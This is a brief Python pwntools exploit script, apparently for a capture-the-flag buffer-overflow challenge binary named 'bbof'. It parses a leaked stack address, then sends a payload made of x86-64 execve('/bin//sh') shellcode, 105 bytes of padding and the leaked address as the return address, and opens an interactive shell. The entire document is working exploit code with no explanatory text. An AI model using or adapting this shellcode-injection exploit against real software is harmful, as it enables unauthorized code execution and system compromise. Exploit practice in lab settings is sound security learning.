from pwn import *

p = process("./bbof")

bufadd = b''
shellcode = b'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'

p.recvuntil(' : ')
bufadd = p.recv(14)

bufadd =int(bufadd,16)

payload = shellcode
payload += b'A'*105
payload += p64(bufadd)

p.sendline(payload)
p.interactive()

